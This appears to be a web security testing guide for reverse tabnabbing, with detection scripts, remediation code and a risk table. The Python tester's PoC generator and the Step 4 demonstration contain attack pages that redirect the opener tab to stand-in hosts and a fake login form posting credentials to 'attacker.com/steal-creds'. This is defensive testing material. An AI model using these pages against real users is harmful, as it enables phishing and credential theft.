# WSTG-CLNT-14: Testing for Reverse Tabnabbing

## Test ID
WSTG-CLNT-14

## Test Name
Testing for Reverse Tabnabbing

## High-Level Description

Reverse Tabnabbing is a phishing attack where a malicious page opened via `target="_blank"` can modify the opener page's location through `window.opener`. This can redirect users to a phishing page while they believe they're still on the original site.

---

## What to Check

- [ ] Links with target="_blank"
- [ ] rel="noopener noreferrer" attribute
- [ ] window.open() calls without noopener
- [ ] User-generated links
- [ ] Dynamic link creation

---

## How to Test

### Step 1: Identify Vulnerable Links

```bash
#!/bin/bash
TARGET="https://target.com"

# Find links with target="_blank"
echo "[*] Finding target=_blank links..."

curl -s "$TARGET" | grep -oP '<a[^>]*target=["\']_blank["\'][^>]*>' | while read -r link; do
    echo "Link: $link"

    if ! echo "$link" | grep -qi 'rel="[^"]*noopener'; then
        echo "  [!] Missing noopener"
    fi

    if ! echo "$link" | grep -qi 'rel="[^"]*noreferrer'; then
        echo "  [!] Missing noreferrer"
    fi
done
```

### Step 2: Reverse Tabnabbing Tester

```python
#!/usr/bin/env python3
"""
Reverse Tabnabbing Vulnerability Tester
"""

import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin

class TabnabbingTester:
    def __init__(self, url):
        self.url = url
        self.findings = []

    def fetch_page(self):
        """Fetch target page"""
        print(f"[*] Fetching {self.url}")
        response = requests.get(self.url)
        return response.text

    def analyze_links(self, html):
        """Analyze links for reverse tabnabbing vulnerabilities"""
        print("\n[*] Analyzing links...")

        soup = BeautifulSoup(html, 'html.parser')

        # Find all links with target="_blank"
        blank_links = soup.find_all('a', target='_blank')

        for link in blank_links:
            href = link.get('href', '')
            rel = link.get('rel', [])

            # Convert rel to list if string
            if isinstance(rel, str):
                rel = rel.split()

            has_noopener = 'noopener' in rel
            has_noreferrer = 'noreferrer' in rel

            if not has_noopener:
                print(f"[VULN] Missing 'noopener': {href[:50]}")
                self.findings.append({
                    "type": "Missing noopener",
                    "href": href,
                    "severity": "Medium",
                    "element": str(link)[:100]
                })

            if not has_noreferrer:
                print(f"[INFO] Missing 'noreferrer': {href[:50]}")

    def analyze_javascript(self, html):
        """Analyze JavaScript for window.open vulnerabilities"""
        print("\n[*] Analyzing JavaScript window.open calls...")

        # Find window.open calls
        window_open_pattern = r'window\.open\s*\([^)]+\)'
        matches = re.findall(window_open_pattern, html)

        for match in matches:
            # Check if noopener is specified in features
            if 'noopener' not in match.lower():
                print(f"[VULN] window.open without noopener: {match[:60]}")
                self.findings.append({
                    "type": "window.open without noopener",
                    "code": match,
                    "severity": "Medium"
                })

    def analyze_dynamic_links(self, html):
        """Check for dynamic link creation patterns"""
        print("\n[*] Checking for dynamic link creation...")

        # Patterns that might create vulnerable links
        patterns = [
            (r'\.setAttribute\s*\(\s*["\']target["\']\s*,\s*["\']_blank["\']',
             "setAttribute with _blank"),
            (r'\.target\s*=\s*["\']_blank["\']',
             "Direct target assignment"),
            (r'createElement\s*\(\s*["\']a["\']\s*\)',
             "Dynamic anchor creation"),
        ]

        for pattern, description in patterns:
            if re.search(pattern, html, re.IGNORECASE):
                print(f"[INFO] Found: {description}")

    def generate_poc(self, target_url):
        """Generate reverse tabnabbing PoC"""
        poc = f'''<!DOCTYPE html>
<html>
<head>
    <title>Interesting Article</title>
</head>
<body>
    <h1>Welcome to our site!</h1>
    <p>Thanks for visiting from {target_url}</p>

    <script>
        // Check if we have access to opener
        if (window.opener) {{
            console.log("Opener accessible!");

            // Redirect the opener to phishing page
            window.opener.location = "https://phishing-site.com/fake-login";

            // Alternative: Replace opener content
            // window.opener.document.body.innerHTML = '<h1>Session Expired</h1><form>...';
        }} else {{
            console.log("Opener not accessible (protected)");
        }}
    </script>

    <noscript>
        <p>Please enable JavaScript</p>
    </noscript>
</body>
</html>'''
        return poc

    def generate_test_page(self):
        """Generate a test page to verify vulnerability"""
        test_page = f'''<!DOCTYPE html>
<html>
<head>
    <title>Reverse Tabnabbing Test</title>
    <style>
        .vulnerable {{ color: red; }}
        .safe {{ color: green; }}
        #status {{ padding: 20px; margin: 20px; border: 1px solid #ccc; }}
    </style>
</head>
<body>
    <h1>Reverse Tabnabbing Test Page</h1>

    <h2>Test Links</h2>

    <p><strong>Vulnerable (no rel):</strong></p>
    <a href="tabnab-poc.html" target="_blank">Open without protection</a>

    <p><strong>Protected (noopener):</strong></p>
    <a href="tabnab-poc.html" target="_blank" rel="noopener">Open with noopener</a>

    <p><strong>Protected (noopener noreferrer):</strong></p>
    <a href="tabnab-poc.html" target="_blank" rel="noopener noreferrer">Open with both</a>

    <h2>JavaScript Tests</h2>
    <button onclick="openVulnerable()">window.open (vulnerable)</button>
    <button onclick="openSafe()">window.open (safe)</button>

    <div id="status">
        <p>Original location: <span id="location">{self.url}</span></p>
    </div>

    <script>
        // Update location display every second
        setInterval(function() {{
            document.getElementById('location').textContent = window.location.href;
        }}, 1000);

        function openVulnerable() {{
            window.open('tabnab-poc.html');
        }}

        function openSafe() {{
            window.open('tabnab-poc.html', '_blank', 'noopener');
        }}
    </script>
</body>
</html>'''
        return test_page

    def run_tests(self):
        """Run all reverse tabnabbing tests"""
        html = self.fetch_page()

        self.analyze_links(html)
        self.analyze_javascript(html)
        self.analyze_dynamic_links(html)

        self.generate_report()

    def generate_report(self):
        """Generate security report"""
        print("\n" + "="*50)
        print("REVERSE TABNABBING REPORT")
        print("="*50)

        if not self.findings:
            print("\nNo reverse tabnabbing vulnerabilities found.")
            print("All target='_blank' links appear to be protected.")
        else:
            print(f"\nFound {len(self.findings)} potential issues:\n")

            for f in self.findings:
                print(f"[{f['severity']}] {f['type']}")
                if 'href' in f:
                    print(f"  Link: {f['href'][:80]}")
                if 'code' in f:
                    print(f"  Code: {f['code'][:80]}")
                print()

            print("\n[*] PoC HTML (save as tabnab-poc.html):")
            print(self.generate_poc(self.url))

# Usage
tester = TabnabbingTester("https://target.com")
tester.run_tests()
```

### Step 3: Browser Console Test

```javascript
// Check page for vulnerable links
(function() {
    const links = document.querySelectorAll('a[target="_blank"]');
    let vulnerable = [];
    let safe = [];

    links.forEach(link => {
        const rel = link.getAttribute('rel') || '';
        const href = link.getAttribute('href') || '';

        if (!rel.includes('noopener')) {
            vulnerable.push({
                href: href,
                rel: rel,
                text: link.textContent.substring(0, 50)
            });
        } else {
            safe.push(href);
        }
    });

    console.log('=== Reverse Tabnabbing Analysis ===');
    console.log(`Total target="_blank" links: ${links.length}`);
    console.log(`Vulnerable: ${vulnerable.length}`);
    console.log(`Safe: ${safe.length}`);

    if (vulnerable.length > 0) {
        console.log('\nVulnerable links:');
        vulnerable.forEach(v => {
            console.log(`  - ${v.href}`);
            console.log(`    rel="${v.rel}"`);
        });
    }

    // Check window.open in inline scripts
    const scripts = document.querySelectorAll('script:not([src])');
    scripts.forEach(script => {
        if (script.textContent.includes('window.open') &&
            !script.textContent.includes('noopener')) {
            console.log('\n[!] Potentially vulnerable window.open found');
        }
    });
})();
```

### Step 4: Attack Demonstration

```html
<!-- attacker.html - Hosted on attacker's site -->
<!DOCTYPE html>
<html>
<head>
    <title>News Article</title>
</head>
<body>
    <h1>Interesting Content</h1>
    <p>This is a legitimate-looking page...</p>

    <script>
        // Attack: Redirect opener to phishing page
        if (window.opener) {
            // Method 1: Direct location change
            window.opener.location = 'https://attacker.com/phishing.html';

            // Method 2: Gradual replacement (stealthier)
            // setTimeout(function() {
            //     window.opener.location = 'https://attacker.com/session-expired.html';
            // }, 5000);
        }
    </script>
</body>
</html>

<!-- phishing.html - Fake login page -->
<!DOCTYPE html>
<html>
<head>
    <title>Session Expired - Please Login</title>
    <!-- Copy target site's styles -->
</head>
<body>
    <h1>Your session has expired</h1>
    <form action="https://attacker.com/steal-creds" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
</body>
</html>
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Browser DevTools | Inspect link attributes |
| Burp Suite | Analyze page content |
| Custom Scripts | Automated scanning |
| HTML Validators | Check rel attributes |

---

## Remediation

```html
<!-- SECURE: Always use rel="noopener noreferrer" -->
<a href="https://external.com" target="_blank" rel="noopener noreferrer">
    External Link
</a>

<!-- For internal links, noopener alone is sufficient -->
<a href="/internal-page" target="_blank" rel="noopener">
    Internal Link
</a>
```

```javascript
// SECURE: window.open with noopener
function openSecure(url) {
    // Method 1: Use noopener in features string
    window.open(url, '_blank', 'noopener,noreferrer');
}

// Method 2: Null out opener after opening
function openSecureAlt(url) {
    const newWindow = window.open(url, '_blank');
    if (newWindow) {
        newWindow.opener = null;
    }
}

// SECURE: Dynamic link creation
function createSecureLink(url, text) {
    const link = document.createElement('a');
    link.href = url;
    link.target = '_blank';
    link.rel = 'noopener noreferrer';
    link.textContent = text;
    return link;
}
```

```python
# Server-side: Content Security Policy
@app.after_request
def add_security_headers(response):
    # Referrer-Policy helps prevent information leakage
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    return response
```

```javascript
// Automatic protection via JavaScript (defense in depth)
document.addEventListener('DOMContentLoaded', function() {
    // Add noopener to all existing _blank links
    document.querySelectorAll('a[target="_blank"]').forEach(link => {
        const rel = link.getAttribute('rel') || '';
        if (!rel.includes('noopener')) {
            link.setAttribute('rel', (rel + ' noopener noreferrer').trim());
        }
    });

    // Observer for dynamically added links
    const observer = new MutationObserver(mutations => {
        mutations.forEach(mutation => {
            mutation.addedNodes.forEach(node => {
                if (node.nodeType === 1) {
                    const links = node.querySelectorAll ?
                        node.querySelectorAll('a[target="_blank"]') : [];
                    links.forEach(link => {
                        const rel = link.getAttribute('rel') || '';
                        if (!rel.includes('noopener')) {
                            link.setAttribute('rel', (rel + ' noopener noreferrer').trim());
                        }
                    });
                }
            });
        });
    });

    observer.observe(document.body, { childList: true, subtree: true });
});
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| External links without noopener | 4.3 | Medium |
| User-generated links without noopener | 5.4 | Medium |
| window.open without noopener | 4.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-1022** | Use of Web Link to Untrusted Target with window.opener Access |

---

## References

- [OWASP Testing Guide - Reverse Tabnabbing](https://owasp.org/www-project-web-security-testing-guide/)
- [MDN - Link types: noopener](https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types/noopener)
- [Mathias Bynens - Reverse Tabnabbing](https://mathiasbynens.github.io/rel-noopener/)

---

## Checklist

```
[ ] target="_blank" links identified
[ ] rel="noopener" presence checked
[ ] rel="noreferrer" presence checked
[ ] window.open() calls analyzed
[ ] Dynamic link creation reviewed
[ ] User-generated content links checked
[ ] PoC created for vulnerable links
[ ] Findings documented
```
